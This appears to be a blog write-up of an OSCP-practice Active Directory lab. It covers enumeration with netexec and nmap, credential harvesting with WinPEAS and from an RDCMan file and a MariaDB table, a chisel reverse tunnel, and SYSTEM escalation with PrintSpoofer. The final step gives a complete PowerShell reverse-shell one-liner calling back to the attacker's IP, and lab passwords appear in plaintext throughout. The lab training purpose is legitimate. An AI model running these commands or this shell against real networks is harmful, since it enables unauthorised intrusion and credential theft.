---
title: Active Directory Hacking
description: >-
 Hacking Active Directory in preparation for the OSCP
author: r3d0t
date: 2026-03-02 09:30:00 -0500
categories: [Penetration Testing, Active Directory]
tags: [oscp, active directory, pentesting, ethical hacking, ethical hacker]
pin: true
media_subpath: ''
comments: true
image: /Secura Images/Active_Directory_Hacking.jpg
---

For this challenge lab, we are given a /24 subnet and initial domain user credentials:

`Eric.Wallows / EricLikesRunning800`

The machines on the network are: 

```
192.168.146.95
192.168.146.96
192.168.146.97
```

We also know that these credentials are valid on 192.168.146.95, which gives us an easy first foothold.

>What we'll be doing:  
>[-]Enumerate an AD environment and identify the DC with netexec and Nmap.  
>[-]Chain local credential hunting, RDP config files, and SQL access into domain admin.  
>[-]Abuse `SeImpersonatePrivilege` with PrintSpoofer on Windows Server 2016 to get a SYSTEM shell. 
{: .prompt-tip}

## Host Discovery

The first thing we want is to understand the routing and confirm which hosts are reachable on the target subnet.

![Checking route.png](/Secura%20Images/Checking%20route.png)

Our VPN interface is tun0, and from the IPs we were given we can see the target network is 192.168.146.0/24.

We can now use `netexec` to check if we can communicate with the ip addresses over the network and basically identify the Domain Controller. We'll use `netexec`

```bash
netexec smb 192.168.146.0/24
```

![netexec to get more info](/Secura%20Images/netexec%20to%20get%20more%20info.png)


> If you hit a netexec error like this, do exactly what it says. You don’t need to keep the old DB. Remove it and rerun netexec so it can rebuild:  
>[-] Schema mismatch detected for table 'shares' in protocol 'SMB'.  
>[-] This is probably because a newer version of nxc is being run on an old DB schema.     
>[-] Optionally save the old DB data (`cp /home/kali/.nxc/workspaces/default/smb.db ~/nxc_smb.bak`).  
>[-] Then remove the SMB DB (`rm -f /home/kali/.nxc/workspaces/default/smb.db`) and run nxc to initialize the new DB.   
{: .prompt-tip}

Nice! From the Output, we learn:

```
192.168.146.95 - SECURE
192.168.146.96 - ERA
192.168.146.97 - DC01 (Domain Controller; Likely)
```

We also see the domain name: `secura.yzx`

To make life easier later, we save the IPs to a file (any editor works: nano, gedit, vim, etc.). 

Here I use gedit:

```bash
gedit secura_ips
```

![gedit ip addresses](/Secura%20Images/gedit%20ip%20addresses.png)

In our case, since we already have the IP list, we can target just these machines with netexec instead of scanning the whole /24:

```bash
netexec smb secura_ips
```

![netexec targeted.png](/Secura%20Images/netexec%20targeted.png)


## Network Enumeration

Next, we run a full TCP port scan against all hosts to identify exposed services:

```bash
nmap -p- -Pn -iL secura_ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt --open
```

To go deeper per host, we can use nmapAutomator.sh. It only takes one IP at a time, so we wrap it in a simple loop:

```bash
while read -r ip; 
	do /home/kali/Tools/nmapAutomator.sh "$ip" Full </dev/tty 
done < secura_ips
```

While Nmap runs, we can start enumerating Active Directory over LDAP. We list domain users and check the description field for any credentials or hints:

```bash
netexec ldap 192.168.146.97 -u eric.wallows -p 'EricLikesRunning800' --users
```

![listing domain users with netexec.png](/Secura%20Images/listing%20domain%20users%20with%20netexec.png)

Nothing interesting shows up in the description field, but we still want a clean username list for later (password spraying, AS‑REP roasting, etc.):
```bash
netexec ldap 192.168.146.97 -u eric.wallows -p 'EricLikesRunning800' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee secura_users
```

This `fgrep -v '[' | fgrep -vi '-Username-' | awk '{print $5}' | tee secura_users` pipeline removes the noise from the netexec output, extracts just the usernames, and saves them to a file for later use.

![saving users from netexec.png](/Secura%20Images/saving%20users%20from%20netexec.png)

## Initial Foothold on SECURE (WinRM)

Since we have our set of credentials, we can log in to 192.168.146.95 via WinRM:

```bash
evil-winrm-py -i 192.168.146.95 -u 'eric.wallows' -p 'EricLikesRunning800'
```

![Login with initial creds.png](/Secura%20Images/Login%20with%20initial%20creds.png)

Once we have a shell, we can immediately hunt for flags:

```bash
Get-ChildItem C:\Users\ -Recurse -Include proof.txt,user.txt,local.txt -File -ErrorAction SilentlyContinue
```

![Pasted image 20260301164017.png](/Secura%20Images/Pasted%20image%2020260301164017.png)

We found `proof.txt` in `C:\Users\Administrator\Desktop`. This is our first flag. 

### Local Enumeration & Credential Hunting on SECURE

Next, we look for local misconfigurations and stored credentials using WinPEAS and LaZagne.

```powershell
upload ~/Tools/LaZagne.exe C:\Users\Public\
upload ~/Tools/Winpeas/winPEASany.exe C:\Users\Public\
```
![Uploaded Winpeas and Lazagne.png](/Secura%20Images/Uploaded%20Winpeas%20and%20Lazagne.png)

LaZagne doesn’t return anything useful here, so we run WinPEAS and redirect output to a file:
```powershell
 .\winPEASany.exe quiet cmd > C:\Users\Public\winpeas.txt
```

After it finishes, we download the file on our attacking machine:
```powershell
download winpeas.txt .
```

WinPEAS output is UTF‑16 and contains ANSI color codes, so we clean it up first:
```bash
iconv -f utf-16 -t utf-8 winpeas.txt -o winpeas_utf8.txt

sed -r 's/\x1B\[[0-9;]*m//g' winpeas_utf8.txt > winpeas_clean.txt # strip the ANSI color code
```

Then we can quickly search it on our attacking box:
```bash
less winpeas_clean.txt
```
Inside `less`, we search for credential-related hits with /credentials and move between matches using n (next) and N (previous).

![credentials found Autologon.png](/Secura%20Images/credentials%20found%20Autologon.png)

WinPEAS finds autologon credentials:

```bash
DefaultUsername: administrator
DefaultPassword: Reality2Show4!.?
```

We also see a reference to an RDCMan.settings file:

![winpeas found rdcman.settings.png](/Secura%20Images/winpeas%20founf%20rdcman.settings.png)

Let's download it for inspection:
```bash
download C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings .
```

![Creds in RDCman.setting.png](/Secura%20Images/Creds%20in%20RDCman.setting.png)


Inside, we find another set of credentials:
```bash
username: apache
password: New2Era4.!
```
These are used to connect to Era.secura.yzx, which lines up with our ERA host.

## Lateral Movement to ERA (apache)

Using the apache credentials, we connect to ERA:

```bash
evil-winrm-py -i 192.168.179.96 -u apache -p 'New2Era4.!'
```

>The lab restarted while I was away, so the subnet changed from .146 to .179. Same three hosts, new IPs:
>192.168.179.95. 
>192.168.179.96. 
>192.168.179.97. 
{: .prompt-warning}


We don’t find a flag on ERA yet, but we do discover a local SQL/MariaDB instance we can access from this machine.

### Pivoting to Internal SQL via Chisel

To reach the database from our attacking box, we set up a reverse port forward with chisel.

Upload chisel.exe to the target:
```bash
upload ~/Tools/chisel.exe C:\.
```

Start a chisel server with reverse tunneling enabled on our attacking machine. 
```bash
./chisel server -p 8082 --reverse
```

Then, from the target, connect back and request a reverse tunnel that forwards local MySQL port 3306 to our attacking machine
```bash
.\chisel.exe client 192.168.45.236:8082 R:3306:127.0.0.1:3306
```

Now from our attacking machine, we can treat the remote MySQL as if it were local:
```bash
mysql -u root -h 127.0.0.1 -P 3306 --skip-ssl
```

Once connected, we enumerate:
```bash
show databases;
```
![MadiaDB show databases.png](/Secura%20Images/MadiaDB%20show%20databases.png)

The creds database looks promising:
```bash
use creds;
show tables;
```
![MariaDB use creds.png](/Secura%20Images/MariaDB%20use%20creds.png)


There is a creds table inside, let's dump it:
```bash
SELECT * FROM creds;
```
![checking creds table.png](/Secura%20Images/checking%20creds%20table.png)

We get some credentials, including ones for `administrator` and `charlotte`.

## Lateral Movement to DC01 (Database Creds)

First, we try the new administrator credentials on ERA:
```bash
evil-winrm-py -i 192.168.179.96 -u administrator -p Almost4There8.?
```

![connected to 192.168.xx.96 as admin.png](/Secura%20Images/connected%20to%20192.168.xx.96%20as%20admin.png)

From here, we can reuse our flag-hunting command:

```console
Get-ChildItem C:\Users\ -Recurse -Include proof.txt,user.txt,local.txt -File -ErrorAction SilentlyContinue
```

Next, we target the Domain Controller with charlotte’s credentials:
```bash
evil-winrm-py -i 192.168.179.97 -u charlotte -p Game2On4.!
```

![login as charlotte.png](/Secura%20Images/login%20as%20charlotte.png)

On this host we obtain the local flag, but we still need proof.txt, so we’ll escalate privileges.

### Privilege Escalation: Abusing SeImpersonate for DA (PrintSpoofer)

To look for escalation paths, we use SharpUp.exe.

Upload and run it:
```bash
.\SharpUp.exe audit
```

![Sharpup.exe audit.png](/Secura%20Images/Sharpup.exe%20audit.png)

`SharpUp` reports that the SeImpersonatePrivilege is enabled. This is a classic target for tools like PrintSpoofer.exe.

First, let's confirm the OS version:
```bash
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object ProductName, ReleaseId, CurrentBuildNumber
```
![Checking windows version.png](/Secura%20Images/Checking%20windows%20version.png)

The host is Windows Server 2016, so PrintSpoofer should work.

We upload PrintSpoofer.exe to the target, then set up a listener on our attacking machine:
```bash
 nc -lvnp 2121
```

Finally, we run `PrintSpoofer` to spawn a SYSTEM PowerShell reverse shell:
```bash
.\PrintSpoofer.exe -c "powershell.exe -nop -ep bypass -c `$client=New-Object System.Net.Sockets.TCPClient('192.168.45.236',2121);`$s=`$client.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0,`$i);`$sb=(iex `$d 2>&1 | Out-String );`$sb2=`$sb.Split(`"`r`"`n`");`$sb2[-2];`$sendbyte=([text.encoding]::ASCII).GetBytes(`$sb+'PS>');`$s.Write(`$sendbyte,0,`$sendbyte.Length);`$s.Flush()};`$client.Close()"
```

And boom! We got our SYSTEM shell

![Shell from Printspoofer.exe.png](/Secura%20Images/Shell%20from%20Printspoofer.exe.png)

From here, we can grab the final proof.txt flag from the Administrator desktop and complete the lab.



